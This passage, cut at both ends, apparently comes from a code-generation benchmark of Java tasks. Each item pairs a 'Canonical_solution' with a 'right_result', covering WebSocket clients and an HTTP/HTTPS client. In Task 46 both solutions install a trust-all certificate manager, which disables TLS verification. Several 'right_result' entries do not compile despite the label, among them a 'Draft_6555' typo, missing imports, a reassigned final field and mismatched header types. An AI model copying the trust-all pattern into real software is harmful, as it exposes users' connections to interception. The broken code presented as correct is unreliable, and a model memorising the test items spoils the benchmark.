    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.JSONObject;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\n\npublic class TransportClient extends WebSocketClient {\n\n    public TransportClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake serverHandshake) {\n        log.info(\"Connected and auth...\");\n    }\n\n    @Override\n    public void onMessage(String s) {\n        JSONObject jsonObject = JSON.parseObject(s);\n        if (jsonObject.getString(\"msg\").equals(\"pong\")) {\n            return;\n        }\n        log.info(\"Agent <- Server message: {}\", jsonObject);\n        TransportWorker.cachedThreadPool.execute(() -> {\n            switch (jsonObject.getString(\"msg\")) {\n                case \"occupy\" -> handleOccupyMessage(jsonObject);\n                case \"release\" -> handleReleaseMessage(jsonObject);\n                case \"stopDebug\" -> handleStopDebugMessage(jsonObject);\n                case \"settings\" -> handleSettingsMessage(jsonObject);\n                case \"auth\" -> handleAuthMessage(jsonObject);\n                case \"shutdown\" -> AgentManagerTool.stop();\n                case \"reboot\" -> handleRebootMessage(jsonObject);\n                case \"heartBeat\" -> handleHeartBeatMessage();\n                case \"hub\" -> PHCTool.setPosition(jsonObject.getInteger(\"position\"), jsonObject.getString(\"type\"));\n                case \"runStep\" -> handleRunStepMessage(jsonObject);\n                case \"debugStep\" -> handleDebugStepMessage(jsonObject);\n                case \"suite\" -> handleSuiteMessage(jsonObject);\n                case \"forceStopSuite\" -> handleForceStopSuiteMessage(jsonObject);\n            }\n        });\n    }\n\n    @Override\n    public void onClose(int i, String s, boolean b) {\n        if (TransportWorker.isKeyAuth) {\n            log.info(\"Server disconnected. Retry in 10s...\");\n        }\n        if (TransportWorker.client == this) {\n            TransportWorker.client = null;\n        }\n    }\n\n    @Override\n    public void onError(Exception e) {\n        log.info(e.getMessage());\n    }\n\n    private void handleOccupyMessage(JSONObject jsonObject) {\n        String udId = jsonObject.getString(\"udId\");\n        String token = jsonObject.getString(\"token\");\n        int platform = jsonObject.getInteger(\"platform\");\n\n        boolean lockSuccess = false;\n        try {\n            lockSuccess = DevicesLockMap.lockByUdId(udId, 30L, TimeUnit.SECONDS);\n        } catch (InterruptedException e) {\n            log.info(\"Fail to get device lock, cause {}\", e.getMessage());\n        }\n        if (!lockSuccess) {\n            log.info(\"Fail to get device lock... please make sure device is not busy.\");\n            return;\n        }\n\n        switch (platform) {\n            case PlatformType.ANDROID -> handleAndroidOccupy(udId, jsonObject);\n            case PlatformType.IOS -> handleIOSOccupy(udId, jsonObject);\n        }\n\n        JSONObject jsonDebug = new JSONObject();\n        jsonDebug.put(\"msg\", \"debugUser\");\n        jsonDebug.put(\"token\", token);\n        jsonDebug.put(\"udId\", udId);\n        TransportWorker.send(jsonDebug);\n    }\n\n    private void handleAndroidOccupy(String udId, JSONObject jsonObject) {\n        log.info(\"android lock udId\uff1a{}\", udId);\n        AndroidDeviceLocalStatus.startDebug(udId);\n\n        IDevice iDevice = AndroidDeviceBridgeTool.getIDeviceByUdId(udId);\n        if (iDevice == null) {\n            log.info(\"Target device is not connecting, please check the connection.\");\n            return;\n        }\n\n        int sasPort = jsonObject.getInteger(\"sasRemotePort\");\n        int uiaPort = jsonObject.getInteger(\"uia2RemotePort\");\n\n        if (sasPort != 0) {\n            AndroidSupplyTool.startShare(udId, sasPort);\n        }\n\n        if (uiaPort != 0) {\n            try {\n                AndroidDeviceBridgeTool.startUiaServer(iDevice, uiaPort);\n            } catch (InstallException e) {\n                log.error(e.getMessage());\n            }\n        }\n\n        OccupyMap.map.put(udId,\n                ScheduleTool.schedule(() -> {\n                    log.info(\"time up!\");\n                    androidRelease(udId);\n                }, BytesTool.remoteTimeout));\n    }\n\n    private void handleIOSOccupy(String udId, JSONObject jsonObject) {\n        log.info(\"ios lock udId\uff1a{}\", udId);\n        IOSDeviceLocalStatus.startDebug(udId);\n\n        if (!SibTool.getDeviceList().contains(udId)) {\n            log.info(\"Target device is not connecting, please check the connection.\");\n            return;\n        }\n\n        int sibPort = jsonObject.getInteger(\"sibRemotePort\");\n        int wdaPort = jsonObject.getInteger(\"wdaServerRemotePort\");\n        int wdaMjpegPort = jsonObject.getInteger(\"wdaMjpegRemotePort\");\n\n        if (sibPort != 0) {\n            SibTool.startShare(udId, sibPort);\n        }\n\n        if (wdaPort != 0 || wdaMjpegPort != 0) {\n            try {\n                SibTool.startWda(udId, wdaPort, wdaMjpegPort);\n            } catch (IOException | InterruptedException e) {\n                log.error(e.getMessage());\n            }\n        }\n\n        OccupyMap.map.put(udId,\n                ScheduleTool.schedule(() -> {\n                    log.info(\"time up!\");\n                    iosRelease(udId);\n                }, BytesTool.remoteTimeout));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport org.json.JSONObject;\n\nimport java.net.URI;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class TransportClient extends WebSocketClient {\n    private ExecutorService executorService = Executors.newFixedThreadPool(10);\n\n    public TransportClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected to server\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        try {\n            JSONObject jsonObject = new JSONObject(message);\n            String messageType = jsonObject.getString(\"type\");\n            switch (messageType) {\n                case \"occupy\":\n                    handleOccupyMessage(jsonObject);\n                    break;\n                // Handle other message types similarly\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \" + reason);\n        // Add reconnection logic here\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        ex.printStackTrace();\n    }\n\n    private void handleOccupyMessage(JSONObject jsonObject) throws Exception {\n        String platform = jsonObject.getString(\"platform\");\n        String udId = jsonObject.getString(\"udId\");\n        JSONObject params = jsonObject.getJSONObject(\"params\");\n\n        if (\"android\".equals(platform)) {\n            handleAndroidOccupy(udId, params);\n        } else if (\"ios\".equals(platform)) {\n            handleIOSOccupy(udId, params);\n        }\n    }\n\n    private void handleAndroidOccupy(String udId, JSONObject jsonObject) {\n        // Start Android debug session and required services\n    }\n\n    private void handleIOSOccupy(String udId, JSONObject jsonObject) {\n        // Start iOS debug session and required services\n    }\n\n    // Additional handler methods for other message types go here\n}\n```"
  },
  {
    "Task_id": 459,
    "Instruction": "Task Description: Create a WebSocket client class in Java using the org.java_websocket library to establish a connection to a WebSocket server and handle communication events.\n\nClass Description: The MyWebSocketClient class extends WebSocketClient to provide a custom WebSocket client implementation. It supports WebSocket communication with a server, including connection establishment, message exchange, and error handling. The class includes event handlers for WebSocket lifecycle events.\n\nAttributes:\n- perMessageDeflateDraft: [Draft] - A WebSocket draft implementation with Per-Message Deflate extension for message compression.\n\nMethods:\n- MyWebSocketClient: [Constructor](String serverUri) -> [void] - Initializes the WebSocket client with the server URI. Throws URISyntaxException if the URI is invalid.\n- onOpen: [void](ServerHandshake handshakedata) -> [void] - Callback invoked when the WebSocket connection is established.\n- onMessage: [void](String message) -> [void] - Callback invoked when a message is received from the server.\n- onClose: [void](int code, String reason, boolean remote) -> [void] - Callback invoked when the WebSocket connection is closed.\n- onError: [void](Exception ex) -> [void] - Callback invoked when an error occurs during WebSocket communication.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Collections;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.extensions.permessage_deflate.PerMessageDeflateExtension;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class MyWebSocketClient extends WebSocketClient {\n\n    private static final Draft perMessageDeflateDraft = new Draft_6455(\n        new PerMessageDeflateExtension());\n\n    public MyWebSocketClient(String serverUri) throws URISyntaxException {\n        super(new URI(serverUri), perMessageDeflateDraft);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n    }\n\n    @Override\n    public void onMessage(String message) {\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onError(Exception ex) {\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\nimport java.net.URISyntaxException;\n\npublic class MyWebSocketClient extends WebSocketClient {\n    private static final Draft perMessageDeflateDraft = new Draft_6555();\n\n    public MyWebSocketClient(String serverUri) throws URISyntaxException {\n        super(new URI(serverUri));\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected to server\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \" + reason);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        ex.printStackTrace();\n    }\n}\n```"
  },
  {
    "Task_id": 46,
    "Instruction": "Task Description: Create a Java class for HTTP communication that supports both HTTP and HTTPS protocols, with methods for GET and POST requests, including SSL configuration for secure connections.\n\nClass Description: The HttpCommunicationClient class provides functionality for making HTTP/HTTPS requests with configurable SSL settings. It supports both synchronous GET and POST operations with customizable headers and request bodies.\n\nAttributes:\n- usesSSL: boolean - Indicates whether to use HTTPS (true) or HTTP (false)\n- sslContext: SSLContext - SSL context configuration for HTTPS connections\n- address: InetSocketAddress - The target server address (host and port)\n- uri: URI - Base URI constructed from the address and protocol\n- httpClient: HttpClient - The HTTP client instance for making requests\n- trustAll: TrustManager[] - Array of trust managers that accept all certificates (bypasses SSL verification)\n\nMethods:\n- HttpCommunicationClient(boolean useSSL) -> Constructor - Initializes the client with SSL configuration\n- initialize(InetSocketAddress address) -> void - Sets up the HTTP client with target address and creates base URI\n- get(String urlPath) -> HttpResponse<String> - Sends a GET request to the specified URL path and returns the response\n- post(String urlPath, String body, String[]... headers) -> HttpResponse<String> - Sends a POST request with body and headers to the specified URL path\n- post(String body, String[]... headers) -> HttpResponse<String> - Sends a POST request with body and headers to the base URI",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpClient.Redirect;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpRequest.Builder;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.Locale;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509ExtendedTrustManager;\n\npublic class HttpCommunicationClient {\n\n    private final boolean usesSSL;\n    private final SSLContext sslContext;\n    private InetSocketAddress address;\n    protected URI uri;\n    protected HttpClient httpClient;\n\n    private static TrustManager[] trustAll = new TrustManager[]{\n        new X509ExtendedTrustManager() {\n            public X509Certificate[] getAcceptedIssuers() {\n                return null;\n            }\n\n            public void checkClientTrusted(X509Certificate[] certs, String authType) {\n            }\n\n            public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {\n            }\n\n            @Override\n            public void checkClientTrusted(X509Certificate[] chain, String authType, Socket socket) throws CertificateException {\n            }\n\n            @Override\n            public void checkServerTrusted(X509Certificate[] chain, String authType, Socket socket) throws CertificateException {\n            }\n\n            @Override\n            public void checkClientTrusted(X509Certificate[] chain, String authType, SSLEngine engine) throws CertificateException {\n            }\n\n            @Override\n            public void checkServerTrusted(X509Certificate[] chain, String authType, SSLEngine engine) throws CertificateException {\n            }\n        }\n    };\n\n    public HttpCommunicationClient(boolean useSSL) {\n        try {\n            sslContext = SSLContext.getInstance(\"TLSv1.2\");\n            sslContext.init(null, trustAll, new SecureRandom());\n        } catch (KeyManagementException | NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n        this.usesSSL = useSSL;\n    }\n\n    public void initialize(InetSocketAddress address) {\n        this.httpClient = HttpClient.newBuilder()\n            .followRedirects(Redirect.NORMAL)\n            .sslContext(sslContext)\n            .build();\n        this.address = address;\n        this.uri = URI.create(String.format(Locale.ENGLISH,\n            \"%s://%s:%s/_sql?error_trace\",\n            usesSSL ? \"https\" : \"http\", address.getHostName(), address.getPort()));\n    }\n\n    public HttpResponse<String> get(String urlPath) throws Exception {\n        assert urlPath != null : \"url cannot be null\";\n        URI uri = URI.create(String.format(Locale.ENGLISH,\n            \"%s://%s:%s/%s\", usesSSL ? \"https\" : \"http\", address.getHostName(), address.getPort(), urlPath));\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .build();\n        return httpClient.send(request, BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String urlPath, String body, String[] ... headers) throws Exception {\n        assert urlPath != null : \"url cannot be null\";\n        URI uri = URI.create(String.format(Locale.ENGLISH,\n            \"%s://%s:%s/%s\", usesSSL ? \"https\" : \"http\", address.getHostName(), address.getPort(), urlPath));\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .POST(body == null ? BodyPublishers.noBody() : BodyPublishers.ofString(body))\n            .build();\n        return httpClient.send(request, BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String body, String[] ... headers) throws Exception {\n        Builder builder = HttpRequest.newBuilder(uri)\n            .header(\"Content-Type\", \"application/json\");\n        if (body != null) {\n            builder.POST(BodyPublishers.ofString(body));\n        }\n        for (String[] header : headers) {\n            builder.headers(header[0], header[1]);\n        }\n        return httpClient.send(builder.build(), BodyHandlers.ofString());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.cert.X509Certificate;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\n\npublic class HttpCommunicationClient {\n    private boolean usesSSL;\n    private SSLContext sslContext;\n    private InetSocketAddress address;\n    private URI uri;\n    private HttpClient httpClient;\n    private TrustManager[] trustAll = new TrustManager[]{\n        new X509TrustManager() {\n            public X509Certificate[] getAcceptedIssuers() {\n                return null;\n            }\n            public void checkClientTrusted(X509Certificate[] certs, String authType) {}\n            public void checkServerTrusted(X509Certificate[] certs, String authType) {}\n        }\n    };\n\n    public HttpCommunicationClient(boolean useSSL) throws NoSuchAlgorithmException, KeyManagementException {\n        this.usesSSL = useSSL;\n        if (useSSL) {\n            sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, trustAll, new java.security.SecureRandom());\n        } else {\n            sslContext = null;\n        }\n        httpClient = HttpClient.newBuilder()\n            .sslParameters(new javax.net.ssl.SSLParameters())\n            .build();\n    }\n\n    public void initialize(InetSocketAddress address) {\n        this.address = address;\n        if (usesSSL) {\n            uri = URI.create(\"https://\" + address.getHostName() + \":\" + address.getPort());\n        } else {\n            uri = URI.create(\"http://\" + address.getHostName() + \":\" + address.getPort());\n        }\n    }\n\n    public HttpResponse<String> get(String urlPath) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(uri.resolve(urlPath))\n            .GET()\n            .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String urlPath, String body, String[]... headers) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(uri.resolve(urlPath))\n            .header(\"Content-Type\", \"application/json\")\n            .POST(HttpRequest.BodyPublishers.ofString(body))\n            .headers(headersToMap(headers))\n            .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String body, String[]... headers) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(uri)\n            .header(\"Content-Type\", \"application/json\")\n            .POST(HttpRequest.BodyPublishers.ofString(body))\n            .headers(headersToMap(headers))\n            .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    private String[][] headersToMap(String[]... headers) {\n        int size = 0;\n        for (String[] header : headers) {\n            size += header.length;\n        }\n        String[][] result = new String[size / 2][2];\n        int index = 0;\n        for (String[] header : headers) {\n            for (int i = 0; i < header.length; i += 2) {\n                result[index++] = new String[]{header[i], header[i + 1]};\n            }\n        }\n        return result;\n    }\n}\n```"
  },
  {
    "Task_id": 460,
    "Instruction": "Task Description: Create a WebSocket client class in Java using the org.java_websocket library to establish a connection to a WebSocket server and handle communication events.\n\nClass Description: The SimpleClient class extends WebSocketClient to provide a basic WebSocket client implementation. It handles connection events, message reception, connection closure, and errors through callback methods.\n\nAttributes:\n- serverUri: URI - The URI of the WebSocket server to connect to (inherited from WebSocketClient)\n\nMethods:\n- SimpleClient(URI serverUri) -> None - Constructor that initializes the WebSocket client with the server URI.\n- onOpen(ServerHandshake handshakedata) -> void - Callback method invoked when the WebSocket connection is successfully opened.\n- onMessage(String message) -> void - Callback method invoked when a text message is received from the server.\n- onClose(int code, String reason, boolean remote) -> void - Callback method invoked when the WebSocket connection is closed.\n- onError(Exception ex) -> void - Callback method invoked when an error occurs in the WebSocket connection.",
    "Canonical_solution": "import java.net.URI;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class SimpleClient extends WebSocketClient {\n\n    public SimpleClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        // Handle connection opening\n    }\n\n    @Override\n    public void onMessage(String message) {\n        // Handle text message received\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        // Handle connection closing\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        // Handle errors\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\nimport java.net.URI;\n\npublic class SimpleClient extends WebSocketClient {\n    public SimpleClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected to server\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \" + reason);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        System.err.println(\"Error occurred: \" + ex.getMessage());\n    }\n}\n```"
  },
  {
    "Task_id": 461,
    "Instruction": "Task Description: Implement a WebSocket client class in Java using the org.java_websocket library to establish a connection with a WebSocket server, send and receive messages, and handle connection events.\n\nClass Description: The ExampleClient class extends WebSocketClient to create a WebSocket client that connects to a specified server URI. It overrides key WebSocket event-handling methods to manage connection lifecycle events.\n\nAttributes:\n- Inherited from WebSocketClient: All necessary attributes for WebSocket connection management are inherited from the parent class.\n\nMethods:\n- Constructor: ExampleClient(URI serverUri, Draft draft) -> void - Initializes the WebSocket client with server URI and protocol draft.\n- Constructor: ExampleClient(URI serverURI) -> void - Initializes the WebSocket client with server URI using default draft.\n- Constructor: ExampleClient(URI serverUri, Map<String, String> httpHeaders) -> void - Initializes the WebSocket client with server URI and custom HTTP headers.\n- onOpen: onOpen(ServerHandshake handshakedata) -> void - Called when connection is established, sends a greeting message.\n- onMessage: onMessage(String message) -> void - Called when a message is received from the server.\n- onClose: onClose(int code, String reason, boolean remote) -> void - Called when the connection is closed, logs closure details.\n- onError: onError(Exception ex) -> void - Called when an error occurs, prints the stack trace.",
    "Canonical_solution": "import java.net.URI;\nimport java.util.Map;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class ExampleClient extends WebSocketClient {\n\n  public ExampleClient(URI serverUri, Draft draft) {\n    super(serverUri, draft);\n  }\n\n  public ExampleClient(URI serverURI) {\n    super(serverURI);\n  }\n\n  public ExampleClient(URI serverUri, Map<String, String> httpHeaders) {\n    super(serverUri, httpHeaders);\n  }\n\n  @Override\n  public void onOpen(ServerHandshake handshakedata) {\n    send(\"Hello, it is me. Mario :)\");\n    System.out.println(\"opened connection\");\n  }\n\n  @Override\n  public void onMessage(String message) {\n    System.out.println(\"received: \" + message);\n  }\n\n  @Override\n  public void onClose(int code, String reason, boolean remote) {\n    System.out.println(\n        \"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \"\n            + reason);\n  }\n\n  @Override\n  public void onError(Exception ex) {\n    ex.printStackTrace();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\nimport java.util.Map;\n\npublic class ExampleClient extends WebSocketClient {\n    public ExampleClient(URI serverUri, Draft draft) {\n        super(serverUri, draft);\n    }\n\n    public ExampleClient(URI serverURI) {\n        super(serverURI);\n    }\n\n    public ExampleClient(URI serverUri, Map<String, String> httpHeaders) {\n        super(serverUri, httpHeaders);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected to server\");\n        this.send(\"Hello Server!\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \" + reason);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        ex.printStackTrace();\n    }\n}\n```"
  },
  {
    "Task_id": 462,
    "Instruction": "Task Description: Create a WebSocket client class that extends the basic WebSocketClient functionality to handle WebSocket communication with event callbacks and response streaming.\n\nClass Description: The MilkmanWebsocketClient class extends WebSocketClient to provide custom WebSocket client functionality. It handles WebSocket events (open, message, close, error) and streams responses to a subscriber while managing asynchronous request control.\n\nAttributes:\n- responseSubscriber: [Subscriber<byte[]>] - A subscriber that receives response data as byte arrays\n- asyncControl: [AsyncControl] - An asynchronous control object for managing request state and cancellation\n\nMethods:\n- MilkmanWebsocketClient([URI serverUri, Subscriber<byte[]> responseSubscriber, AsyncControl asyncControl]) -> [void] - Constructor that initializes the WebSocket client with server URI, response subscriber, and async control\n- onOpen([ServerHandshake handshakedata]) -> [void] - Callback when WebSocket connection is opened, triggers request ready\n- send([String message]) -> [void] - Sends a message through WebSocket and notifies subscriber of sent message\n- onMessage([String message]) -> [void] - Callback when message is received, notifies subscriber\n- onClose([int code, String reason, boolean remote]) -> [void] - Callback when WebSocket is closed, completes subscriber and marks request success\n- onError([Exception ex]) -> [void] - Callback when error occurs, notifies subscriber and marks request failure",
    "Canonical_solution": "import milkman.utils.AsyncResponseControl.AsyncControl;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport org.reactivestreams.Subscriber;\n\nimport java.net.URI;\n\npublic class MilkmanWebsocketClient extends WebSocketClient {\n\n    private final Subscriber<byte[]> responseSubscriber;\n    private final AsyncControl asyncControl;\n\n    public MilkmanWebsocketClient(URI serverUri,\n                                Subscriber<byte[]> responseSubscriber,\n                                AsyncControl asyncControl) {\n        super(serverUri);\n        this.responseSubscriber = responseSubscriber;\n        this.asyncControl = asyncControl;\n        asyncControl.onCancellationRequested.add(() -> close());\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        asyncControl.triggerReqeuestReady();\n    }\n\n    @Override\n    public void send(String message) {\n        String msg = \"SENT: \\n\" + message + \"\\n\\n\";\n        responseSubscriber.onNext(msg.getBytes());\n        super.send(message);\n    }\n\n    @Override\n    public void onMessage(String message) {\n        String msg = \"RECEIVED: \\n\" + message + \"\\n\\n\";\n        responseSubscriber.onNext(msg.getBytes());\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        responseSubscriber.onComplete();\n        asyncControl.triggerRequestSucceeded();\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        responseSubscriber.onError(ex);\n        asyncControl.triggerRequestFailed(ex);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport rx.Subscriber;\n\nimport java.net.URI;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class MilkmanWebsocketClient extends WebSocketClient {\n    private final Subscriber<byte[]> responseSubscriber;\n    private final AtomicBoolean asyncControl = new AtomicBoolean(true);\n\n    public MilkmanWebsocketClient(URI serverUri, Subscriber<byte[]> responseSubscriber, AtomicBoolean asyncControl) {\n        super(serverUri);\n        this.responseSubscriber = responseSubscriber;\n        this.asyncControl = asyncControl;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        // Trigger request ready\n        if (!asyncControl.get()) {\n            responseSubscriber.onNext(new byte[0]);\n        }\n    }\n\n    @Override\n    public void onMessage(String message) {\n        // Notify subscriber of received message\n        responseSubscriber.onNext(message.getBytes());\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        // Complete subscriber and mark request success\n        responseSubscriber.onCompleted();\n        asyncControl.set(false);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        // Notify subscriber and mark request failure\n        responseSubscriber.onError(ex);\n        asyncControl.set(false);\n    }\n\n    public void send(String message) {\n        if (isOpen()) {\n            send(message.getBytes());\n            responseSubscriber.onNext(message.getBytes());\n        } else {\n            throw new IllegalStateException(\"WebSocket is not open\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 463,
    "Instruction": "Task Description: Implement a WebSocket client class in Java using the org.java_websocket library to establish a connection with a WebSocket server, handle incoming messages, and manage connection events.\n\nClass Description: WebSocketChatClient is a class that extends WebSocketClient from the org.java_websocket library. It provides functionality to connect to a WebSocket server and handle various WebSocket events such as connection opening, message reception, connection closing, and errors.\n\nAttributes:\n- Inherited from WebSocketClient: All attributes from the parent class WebSocketClient are available but not explicitly defined here.\n\nMethods:\n- Constructor: WebSocketChatClient(URI serverUri) -> void - Initializes the WebSocket client with the server URI.\n- onOpen: onOpen(ServerHandshake handshakedata) -> void - Called when the WebSocket connection is established. Prints \"Connected\" to the console.\n- onMessage: onMessage(String message) -> void - Called when a message is received from the server. Prints the message to the console.\n- onClose: onClose(int code, String reason, boolean remote) -> void - Called when the WebSocket connection is closed. Prints \"Disconnected\" to the console.\n- onError: onError(Exception ex) -> void - Called when an error occurs. Prints the stack trace of the exception.",
    "Canonical_solution": "import java.net.URI;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\nclass WebSocketChatClient extends WebSocketClient {\n\n  public WebSocketChatClient(URI serverUri) {\n    super(serverUri);\n  }\n\n  @Override\n  public void onOpen(ServerHandshake handshakedata) {\n    System.out.println(\"Connected\");\n  }\n\n  @Override\n  public void onMessage(String message) {\n    System.out.println(\"got: \" + message);\n  }\n\n  @Override\n  public void onClose(int code, String reason, boolean remote) {\n    System.out.println(\"Disconnected\");\n  }\n\n  @Override\n  public void onError(Exception ex) {\n    ex.printStackTrace();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "```java\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\n\npublic class WebSocketChatClient extends WebSocketClient {\n\n    public WebSocketChatClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Disconnected\");\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        ex.printStackTrace();\n    }\n}\n```"
  },
  {
    "Task_id": 464,
    "Instruction": "Task Description: Implement a WebSocket client class that handles secure WebSocket connections with custom SSL configuration and event delegation.\n\nClass Description: WebSocketTransport is a WebSocket client implementation that extends the WebSocketClient class from the org.java_websocket library. It manages WebSocket connections with optional SSL/TLS encryption and delegates connection events to a listener interface. The class handles connection establishment, message reception, and connection termination events.\n\nAttributes:\n- CONNECT_TIMEOUT: int - Static constant defining the connection timeout in milliseconds (5000ms)\n- webSocketListener: WebSocketListener - Interface reference for handling WebSocket events (open, message, close, error)\n\nMethods:\n- WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties, Map<String, String> headers, WebSocketListener webSocketListener) -> None - Constructor that initializes the WebSocket client with server URI, SSL properties, custom headers, and event listener. Throws URISyntaxException for invalid URIs.\n- onOpen(ServerHandshake serverHandshake) -> void - Callback when WebSocket connection is established. Delegates to webSocketListener.\n- onMessage(String s) -> void - Callback when a text message is received. Delegates to webSocketListener.\n- onClose(int code, String reason, boolean remote) -> void - Callback when connection is closed. Delegates to webSocketListener.\n- onError(Exception e) -> void - Callback when an error occurs. Delegates to 